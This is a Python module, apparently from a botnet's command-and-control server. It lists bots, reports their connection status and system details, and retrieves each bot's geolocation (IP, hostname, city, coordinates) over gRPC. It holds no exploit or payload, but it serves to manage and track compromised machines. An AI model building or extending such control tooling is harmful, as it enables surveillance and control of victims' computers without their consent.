from server.modules import log, database
from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *

def get_status(botstatus):
    if botstatus == "1":
        status = "DISCONNECTED"
    else:
        status = "CONNECTED"
    return status

def get_bots(db, status):
    if status == 1:
        array = database.get_bots(db)
    else:
        array = database.get_connected_bots(db)
    bots = []
    if len(array) > 0:
        for bot in array:
            status = get_status(bot[1])
            bots.append(Bot(bot_id=bot[0], status=status, system=bot[2], node=bot[3], release=bot[4], version=bot[5], machine=bot[6], processor=bot[7]))
    return bots

def get_bot(db, request):
    log.add(f"./server/logs/server/server", "ADMIN", "BOT", f"Se solicita la información del bot {request.bot_id}", "OK", protocol="HTTP/2")
    array = database.get_bot(db, request.bot_id)
    geoarray = database.get_bot_geolocation(db, request.bot_id)
    if len(array) > 0:
        for bot, geobot in zip(array, geoarray):
            status = get_status(bot[1])
            return Bot(bot_id=bot[0], status=status, system=bot[2], node=bot[3], release=bot[4], version=bot[5], machine=bot[6], processor=bot[7], geo=Geo(ip=geobot[1], hostname=geobot[2], city=geobot[3], region=geobot[4], country=geobot[5], loc=geobot[6]))
    else:
        return Bot(bot_id="", status="DISCONNECTED", system="", node="", release="", version="", machine="", processor="")

def get_geobots(db):
    geoarray = database.get_bots_geolocation(db)
    array = []
    if len(geoarray) > 0:
        for geobot in geoarray:
            array.append(Geo(bot_id=geobot[0], ip=geobot[1], hostname=geobot[2], city=geobot[3], region=geobot[4], country=geobot[5], loc=geobot[6]))
    return array